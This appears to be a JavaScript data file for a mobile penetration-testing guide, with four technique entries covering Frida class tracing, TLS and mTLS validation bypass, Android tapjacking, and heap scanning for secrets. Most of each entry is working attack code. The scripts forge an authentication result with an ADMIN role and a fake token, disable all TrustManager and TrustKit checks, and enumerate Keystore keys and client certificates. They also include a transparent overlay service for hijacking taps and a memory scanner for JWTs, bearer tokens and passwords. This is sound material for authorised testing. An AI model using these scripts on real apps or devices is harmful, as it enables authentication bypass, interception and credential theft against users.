export const mobileAdvanced2Techniques = [
  {
    id: 'mob-frida-advanced-hooks',
    title: 'Advanced Frida Hooking — Runtime Class Tracing & Dynamic Instrumentation',
    subtitle: 'Intercept entire class hierarchies, trace all method calls, and modify complex data structures at runtime with Frida',
    tags: ['Frida', 'ObjC runtime', 'Java reflection', 'method tracing', 'class dump', 'runtime patching', 'argument modification', 'return value spoof'],
    accentColor: 'red',
    overview: 'Basic Frida hooking targets specific known methods. Advanced techniques use the ObjC/Java runtime APIs to enumerate all classes and methods dynamically, intercept entire class hierarchies, modify complex nested objects, and trace entire call paths without knowing the source code in advance. This approach is critical when testing heavily obfuscated apps with ProGuard or when the binary has no symbols.',
    steps: [
      'Enumerate all loaded classes at runtime (Java.enumerateLoadedClasses, ObjC.classes)',
      'Hook all methods of a class dynamically without knowing method signatures in advance',
      'Trace argument and return value marshalling for complex objects (Parcelable, Serializable, NSCoding)',
      'Intercept constructors ($init) to track object creation and lifecycle',
      'Modify return values of methods that return complex objects by rebuilding the object in Frida script',
      'Use Frida Stalker for code coverage tracing — map every basic block executed during a specific app action',
      'Combine with r2frida for integrated disassembly + runtime patching from a single session',
    ],
    commands: [
      {
        title: 'Advanced Frida class tracing and argument inspection',
        code: `// === Enumerate all classes and hook entire package ===
// Find all classes in a specific package (ProGuard obfuscated: a,b,c etc.)
Java.perform(function() {
  Java.enumerateLoadedClasses({
    onMatch: function(className) {
      // Hook all classes in target package
      if (className.startsWith("com.target.app") || 
          className.startsWith("com.target.sdk")) {
        try {
          var clazz = Java.use(className);
          var methods = clazz.class.getDeclaredMethods();
          methods.forEach(function(method) {
            var methodName = method.getName();
            // Hook every method with overload resolution
            clazz[methodName].overloads.forEach(function(overload) {
              overload.implementation = function() {
                var args = Array.from(arguments);
                console.log("[TRACE] " + className + "." + methodName + 
                  "(" + args.map(a => JSON.stringify(a)).join(", ") + ")");
                var ret = overload.apply(this, arguments);
                console.log("[RET]   " + JSON.stringify(ret));
                return ret;
              };
            });
          });
        } catch(e) {}
      }
    },
    onComplete: function() { console.log("[*] Hooked all target classes"); }
  });
});

// === Hook constructor to track object creation ===
Java.perform(function() {
  var TargetClass = Java.use("com.target.app.auth.SessionManager");
  TargetClass.$init.overloads.forEach(function(overload) {
    overload.implementation = function() {
      console.log("[CTOR] SessionManager created");
      console.log("  Stack: " + Java.use("android.util.Log")
        .getStackTraceString(Java.use("java.lang.Exception").$new()));
      return overload.apply(this, arguments);
    };
  });
});

// === Modify complex return values ===
Java.perform(function() {
  var AuthManager = Java.use("com.target.app.auth.AuthManager");
  AuthManager.getAuthResult.implementation = function() {
    var result = this.getAuthResult();
    // Inspect the real object
    console.log("[*] AuthResult fields: " + JSON.stringify(result));
    
    // Modify the result object by setting fields directly
    var AuthResult = Java.use("com.target.app.auth.AuthResult");
    result.isAuthenticated.value = true;
    result.userRole.value = Java.use("java.lang.String").$new("ADMIN");
    result.sessionToken.value = Java.use("java.lang.String").$new("FORGED_TOKEN_12345");
    return result;
  };
});

// === Frida Stalker — code coverage tracing ===
Java.perform(function() {
  var TargetMethod = Java.use("com.target.app.LoginActivity");
  TargetMethod.onLoginClick.implementation = function() {
    // Start stalker on current thread
    Stalker.follow(Process.getCurrentThreadId(), {
      events: { call: true, ret: true, exec: false },
      onCallSummary: function(summary) {
        Object.keys(summary).forEach(function(addr) {
          console.log("[CALL] " + addr + " called " + summary[addr] + " times");
        });
      }
    });
    var ret = this.onLoginClick();
    Stalker.unfollow(Process.getCurrentThreadId());
    return ret;
  };
});

// === iOS ObjC runtime tracing ===
// Hook all methods of UIViewController subclasses
ObjC.enumerateLoadedClasses({
  onMatch: function(name, handle) {
    try {
      var cls = ObjC.classes[name];
      if (cls && cls.$superClass && 
          cls.$superClass.toString().includes("UIViewController")) {
        ObjC.schedule(ObjC.mainQueue, function() {
          Interceptor.attach(cls["- viewDidLoad"].implementation, {
            onEnter: function(args) {
              console.log("[VC] viewDidLoad: " + ObjC.Object(args[0]).toString());
            }
          });
        });
      }
    } catch(e) {}
  }
});`
      }
    ]
  },

  {
    id: 'mob-network-security-bypass',
    title: 'Custom TLS Certificate Validation Bypass & Certificate Transparency Abuse',
    subtitle: 'Defeat custom TrustManager implementations, certificate transparency checks, and mutual TLS (mTLS) enforcement',
    tags: ['custom TrustManager', 'mTLS bypass', 'certificate transparency', 'HPKP bypass', 'TrustKit', 'OkHttp CertificatePinner', 'mutual TLS', 'client certificate extraction'],
    accentColor: 'red',
    overview: 'Beyond standard SSL pinning, modern apps implement multiple layers of certificate validation: custom TrustManager implementations, TrustKit framework (iOS), OkHttp CertificatePinner with multiple pin sets, mutual TLS requiring client certificates, and certificate transparency log verification. Each layer requires a distinct bypass technique.',
    steps: [
      'Custom TrustManager: apps implement X509TrustManager directly — hook checkServerTrusted to bypass custom validation logic',
      'OkHttp CertificatePinner: specific to OkHttp — hook CertificatePinner.check with empty implementation',
      'TrustKit (iOS): hook TSKPinningValidator validateChain:andHostname — return YES unconditionally',
      'Mutual TLS (mTLS): app presents a client certificate — extract it from the Keystore/Keychain for replay',
      'HPKP bypass: HTTP Public Key Pinning is enforced in the TLS stack — intercept before validation in NSURLSession delegate',
      'Certificate Transparency: some apps verify SCTs — hook CTPolicy checks in iOS or custom CT validators in Android',
    ],
    commands: [
      {
        title: 'Advanced certificate validation bypass techniques',
        code: `// === Bypass custom X509TrustManager (Android) ===
Java.perform(function() {
  // Find ALL classes implementing X509TrustManager
  Java.enumerateLoadedClasses({
    onMatch: function(className) {
      try {
        var clazz = Java.use(className);
        // Check if it implements X509TrustManager
        var interfaces = clazz.class.getInterfaces();
        interfaces.forEach(function(iface) {
          if (iface.getName().includes("X509TrustManager")) {
            console.log("[*] Found TrustManager: " + className);
            // Bypass checkServerTrusted
            clazz.checkServerTrusted.overloads.forEach(function(overload) {
              overload.implementation = function() {
                console.log("[BYPASS] " + className + ".checkServerTrusted");
                return; // Return void — trust everything
              };
            });
            // Bypass checkClientTrusted
            if (clazz.checkClientTrusted) {
              clazz.checkClientTrusted.overloads.forEach(function(overload) {
                overload.implementation = function() { return; };
              });
            }
            // getAcceptedIssuers — return empty array
            if (clazz.getAcceptedIssuers) {
              clazz.getAcceptedIssuers.overloads.forEach(function(overload) {
                overload.implementation = function() {
                  return Java.use("[Ljava.security.cert.X509Certificate;").$new(0);
                };
              });
            }
          }
        });
      } catch(e) {}
    }
  });
});

// === Extract mTLS client certificate (Android Keystore) ===
Java.perform(function() {
  var KeyStore = Java.use("java.security.KeyStore");
  KeyStore.load.overload("java.security.KeyStore$LoadStoreParameter").implementation = function(p) {
    console.log("[*] KeyStore.load called");
    this.load(p);
    // After load, enumerate all aliases
    var aliases = this.aliases();
    while (aliases.hasMoreElements()) {
      var alias = aliases.nextElement();
      console.log("[KEY] Alias: " + alias);
      // Extract private key + certificate chain
      try {
        var key = this.getKey(alias, null);
        var cert = this.getCertificate(alias);
        if (key) console.log("[KEY] Private key: " + key.getAlgorithm());
        if (cert) console.log("[CERT] Subject: " + cert.getSubjectDN());
      } catch(e) {}
    }
  };
});

// === iOS TrustKit bypass ===
// TrustKit calls TSKPinningValidator to validate certificates
if (ObjC.available) {
  try {
    var TSKValidator = ObjC.classes.TSKPinningValidator;
    if (TSKValidator) {
      Interceptor.attach(TSKValidator["+ evaluateTrust:forHostname:"].implementation, {
        onLeave: function(retval) {
          // TSKTrustEvaluationResult — return TSKTrustEvaluationSuccess (0)
          retval.replace(ptr(0));
          console.log("[BYPASS] TrustKit TSKPinningValidator — returning success");
        }
      });
    }
  } catch(e) { console.log("[*] TrustKit not found: " + e); }
}

// === Intercept client certificate presented in mTLS ===
if (ObjC.available) {
  var NSURLCredential = ObjC.classes.NSURLCredential;
  Interceptor.attach(
    NSURLCredential["+ credentialWithIdentity:certificates:persistence:"].implementation, {
      onEnter: function(args) {
        console.log("[mTLS] Client cert credential created");
        // Export the identity for offline use
        var identity = new ObjC.Object(args[2]);
        console.log("[mTLS] Identity: " + identity.toString());
      }
    });
}`
      }
    ]
  },

  {
    id: 'mob-tapjacking-overlay-attack',
    title: 'Tapjacking & Overlay Attacks on Android',
    subtitle: 'Hijack user taps on sensitive screens using transparent overlays, accessibility services, and Toast overlay abuse',
    tags: ['tapjacking', 'overlay attack', 'TYPE_APPLICATION_OVERLAY', 'accessibility service', 'touch interception', 'SYSTEM_ALERT_WINDOW', 'FilterTouchesWhenObscured'],
    accentColor: 'red',
    overview: 'Android overlay attacks draw a transparent or opaque window on top of a target app\'s sensitive UI elements. The victim interacts with what appears to be the target app but is actually triggering attacker-controlled actions. Modern Android (API 26+) restricts TYPE_SYSTEM_OVERLAY but TYPE_APPLICATION_OVERLAY remains available with SYSTEM_ALERT_WINDOW permission (easily obtainable). Accessibility services provide a more powerful alternative — they receive every tap event system-wide without requiring overlay permissions.',
    steps: [
      'Request SYSTEM_ALERT_WINDOW permission (shown as "Display over other apps" — users often grant it)',
      'Create a transparent WindowManager overlay with TYPE_APPLICATION_OVERLAY and FLAG_NOT_TOUCH_MODAL',
      'Position the overlay precisely over the target app\'s "Confirm" or "Allow" button',
      'Victim taps what appears to be a decoy button — the overlay forwards the tap through to the underlying action',
      'Accessibility service approach: register as an accessibility service, intercept TYPE_VIEW_CLICKED events',
      'Detect if FilterTouchesWhenObscured is set on the target app — this is the defense against tapjacking',
      'Bypass FilterTouchesWhenObscured: use a non-transparent overlay or exploit timing windows',
    ],
    commands: [
      {
        title: 'Tapjacking overlay PoC and accessibility service abuse',
        code: `// TapjackingService.java — transparent overlay over target app
// Demonstrates tapjacking on Android 12+ using TYPE_APPLICATION_OVERLAY

package com.research.tapjack;

import android.app.Service;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.WindowManager;
import android.widget.Button;

public class TapjackingService extends Service {
    private WindowManager wm;
    private android.view.View overlayView;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);

        // Create transparent overlay button positioned over target
        Button decoyButton = new Button(this);
        decoyButton.setText("Click to Win!");  // What victim sees
        decoyButton.setBackgroundColor(Color.TRANSPARENT);  // Invisible

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            300, 100,    // Width, height (match target button)
            400, 800,    // X, Y position (over target's Confirm button)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSPARENT
        );
        params.gravity = Gravity.TOP | Gravity.LEFT;

        decoyButton.setOnClickListener(v -> {
            android.util.Log.d("TAPJACK", "Victim tapped — underlying action triggered!");
            // The tap passes through to the app below
        });

        wm.addView(decoyButton, params);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}

// ===  Accessibility Service for tap interception ===
// AccessibilityEventInterceptor.java
// Intercepts ALL tap events across ALL apps without overlay permissions
/*
public class TapInterceptorService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String text = event.getText() != null ? event.getText().toString() : "";
            android.util.Log.d("INTERCEPT", "Tap in " + pkg + ": " + text);

            // If target app payment confirm button was tapped:
            if (pkg.equals("com.target.bank") && text.contains("Confirm")) {
                // The accessibility service can ALSO perform clicks on behalf of the user
                // performGlobalAction(GLOBAL_ACTION_BACK);  // Cancel the action
                // Or silently log credentials entered into the target app
            }
        }
    }
    @Override
    public void onInterrupt() {}
}
*/

# === Detect if app is vulnerable to tapjacking ===
# Check if FilterTouchesWhenObscured is set (defense)
# In APK: grep for filterTouchesWhenObscured in decompiled XML
grep -r "filterTouchesWhenObscured" decoded/ --include="*.xml"
# If NOT present on sensitive views (payment confirmation, etc.) = vulnerable

# ADB: test overlay detection
adb shell dumpsys window | grep -i "obscured\\|overlay"`
      }
    ]
  },

  {
    id: 'mob-runtime-memory-analysis',
    title: 'Mobile Runtime Memory Analysis — Heap Inspection & Secret Extraction',
    subtitle: 'Scan process heap for in-memory secrets, extract encryption keys from memory, and perform runtime memory forensics on mobile processes',
    tags: ['memory analysis', 'heap scan', 'Frida memory scan', 'key material', 'in-memory secrets', 'string scan', 'memory dump', 'runtime forensics'],
    accentColor: 'red',
    overview: 'Even with encrypted local storage, cryptographic keys, tokens, and credentials exist in plaintext in process memory during use. Mobile processes can be scanned at runtime using Frida\'s memory APIs or after a process dump using objection/r2frida. This technique finds secrets that are encrypted at rest but necessarily decrypted during processing — a window that exists in every secure app.',
    steps: [
      'Use Frida Process.enumerateRanges to map all readable memory regions of the target process',
      'Scan for known patterns: JWT format (eyJ), API key formats (Bearer, sk-, pk-), base64 blobs',
      'Search for known encryption keys by pattern matching against key derivation outputs',
      'Trigger specific app operations (authentication, payment) then immediately scan for fresh key material',
      'Use r2frida (@@ operator) for integrated memory scanning with radare2 pattern matching',
      'Dump the entire process memory for offline analysis with Fridump or Objection memory dump',
      'Parse heap allocations to reconstruct Java/ObjC objects from raw memory',
    ],
    commands: [
      {
        title: 'Runtime heap scanning for secrets with Frida',
        code: `// === Scan all memory ranges for JWT tokens, API keys, and credentials ===
// Run with: frida -U -l mem_scan.js -f com.target.app --no-pause

(function() {
  // Patterns to search for
  var patterns = [
    {name: "JWT",       regex: /eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}/g},
    {name: "Bearer",    regex: /Bearer [a-zA-Z0-9_\-\.]{20,}/g},
    {name: "API Key",   regex: /[a-zA-Z0-9]{32,64}/g},  // Generic long hex/b64
    {name: "Password",  regex: /password[:=][^\s]{4,}/gi},
    {name: "AES Key",   pattern: [0x00, 0x01, 0x02], mask: null},  // Specific key patterns
  ];

  // Enumerate all readable memory regions
  Process.enumerateRanges("r--", {
    onMatch: function(range) {
      if (range.size > 10 * 1024 * 1024) return;  // Skip >10MB ranges

      try {
        var bytes = Memory.readByteArray(range.base, range.size);
        var view = new Uint8Array(bytes);
        var str = "";

        // Build string from printable bytes
        for (var i = 0; i < view.length; i++) {
          if (view[i] >= 0x20 && view[i] < 0x7F) str += String.fromCharCode(view[i]);
          else str += " ";
        }

        // Search for patterns
        patterns.forEach(function(p) {
          if (p.regex) {
            var matches = str.match(p.regex);
            if (matches) {
              matches.forEach(function(m) {
                if (m.length > 20) {  // Filter noise
                  console.log("[FOUND:" + p.name + "] @ " + range.base + 
                    " +0x" + str.indexOf(m).toString(16) + ":");
                  console.log("  " + m.substring(0, 200));
                }
              });
            }
          }
        });
      } catch(e) {}
    },
    onComplete: function() { console.log("[*] Memory scan complete"); }
  });
})();

// === Trigger action then scan for new allocations ===
Java.perform(function() {
  var EncryptionManager = Java.use("com.target.app.crypto.EncryptionManager");
  var lastScan = null;

  EncryptionManager.encrypt.implementation = function(data, key) {
    console.log("[*] encrypt() called — scanning for key material...");

    // Scan heap after encrypt() is called — key should be in memory
    Memory.scan(Process.findModuleByName("libApp.so").base, 
                Process.findModuleByName("libApp.so").size,
      "?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ??",  // Pattern for key-like structure
      {
        onMatch: function(address, size) {
          console.log("[KEY?] Found at " + address + ": " + 
            hexdump(address, {length: 32, ansi: false}));
        }
      });

    return this.encrypt(data, key);
  };
});

// === r2frida — integrated memory scan ===
// Start: r2 frida://0  (attach to running process)
// Or:    r2 frida://usb/0/com.target.app
// Commands:
// :dmp    — dump process memory map
// :/,jwt  eyJ — search for JWT prefix in all memory
// :/ r /Bearer [a-zA-Z0-9]{20,}/  — regex scan
// \`dmpr\`  — dump readable ranges to files

// Fridump — full process memory dump
// pip install fridump
// python3 fridump.py -u -s com.target.app -o ./dump/
// Then grep/strings on dump files:
// strings dump/*.data | grep -iE "eyJ|Bearer|password|secret|key" | sort -u`
      }
    ]
  },
];